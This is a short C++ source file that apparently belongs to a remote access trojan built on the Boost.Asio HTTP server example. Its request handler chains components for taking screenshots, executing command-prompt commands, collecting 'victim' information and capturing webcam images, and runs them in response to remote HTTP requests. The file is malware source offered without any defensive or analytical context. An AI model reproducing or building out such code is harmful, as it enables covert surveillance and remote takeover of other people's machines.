//
// request_handler.cpp
// ~~~~~~~~~~~~~~~~~~~
//
// Copyright (c) 2003-2015 Christopher M. Kohlhoff (chris at kohlhoff dot com)
//
// Distributed under the Boost Software License, Version 1.0. (See accompanying
// file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
//

#include "request_handler.hpp"
#include "command_prompt_executor.h"
#include "victim_info.h"
#include "webcam_shot.h"

namespace http {
namespace server {

request_handler::request_handler(boost::asio::ip::tcp::socket& sock): socket_(sock)
{
	rootHandler = std::make_unique<ScreenshotTaker>();
	std::unique_ptr<TaskHandlerInterface> cmdHandler = std::make_unique<CommandPromptExecutor>();
	std::unique_ptr<VictimInfoGenerator> vInfoGen = std::make_unique<VictimInfoGenerator>();
	std::unique_ptr<WebcamShot> webCamShotHandler = std::make_unique<WebcamShot>();
	vInfoGen->setNextTask(std::move(webCamShotHandler));
	cmdHandler->setNextTask(std::move(vInfoGen));
	rootHandler->setNextTask(std::move(cmdHandler));
}


void request_handler::handle_request(std::shared_ptr<request> req, std::shared_ptr<reply> rep) const
{
	rootHandler->handleTask(req, rep);
}

} // namespace server
} // namespace http